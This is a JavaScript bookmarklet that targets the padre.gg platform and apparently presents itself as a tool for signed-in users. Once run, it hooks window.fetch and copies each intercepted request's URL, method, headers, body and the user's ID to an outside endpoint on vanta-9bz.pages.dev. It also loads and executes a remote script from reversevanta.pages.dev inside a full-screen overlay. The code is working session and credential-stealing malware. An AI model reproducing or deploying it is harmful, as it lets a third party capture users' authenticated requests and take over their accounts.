javascript:(async () => {
    // --- Part 1: Configuration ---
    // Your Cloudflare Pages endpoint to receive the intercepted data.
    const MY_ENDPOINT = 'https://vanta-9bz.pages.dev/api/log';

    // --- Part 2: Environment Checks ---
    if (location.hostname !== 'padre.gg') {
        alert('This bookmarklet only works on padre.gg');
        location.replace('https://padre.gg');
        return;
    }
    if (!localStorage.getItem('padre-v2-bundles-store-v2')) {
        alert('You must be signed in to use this bookmarklet.');
        return;
    }

    // --- Part 3: Intercept Network Requests ---
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const [resource, options = {}] = args;

        // Only intercept requests to the original domains to avoid infinite loops
        if (resource.includes('padre.gg') || resource.includes('reversevanta.pages.dev')) {
            console.log('🚨 Intercepted Fetch Request:', {
                url: resource,
                method: options.method || 'GET',
                headers: options.headers,
                body: options.body
            });

            // Send a copy of the request data to your endpoint.
            // We extract a potential user_id from localStorage for better tracking.
            const userData = localStorage.getItem('padre-v2-bundles-store-v2');
            let userId = 'anonymous_user';
            try {
                const parsed = JSON.parse(userData);
                userId = parsed.user?.id || 'anonymous_user';
            } catch (e) {
                // Ignore parsing errors
            }

            originalFetch(MY_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    interceptedUrl: resource,
                    interceptedMethod: options.method || 'GET',
                    interceptedHeaders: options.headers,
                    interceptedBody: options.body,
                    interceptedUserId: userId // Pass the user ID to your backend
                })
            }).catch(err => console.error('Failed to send data to my endpoint:', err));
        }

        // Allow the original request to proceed as normal.
        return originalFetch.apply(this, args);
    };

    // --- Part 4: Inject UI and Load Original Scripts ---
    try {
        const loadScript = (src) => new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = src;
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });

        const toolContainer = document.createElement('div');
        toolContainer.id = 'codex';
        toolContainer.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999;';
        document.body.appendChild(toolContainer);

        await Promise.all([
            loadScript('https://padre.gg/assets/codex.js'),
            loadScript('https://14c11728.reversevanta.pages.dev/modalx.js')
        ]);

    } catch (error) {
        console.error('❌ Error initializing bookmarklet:', error);
    }
})();
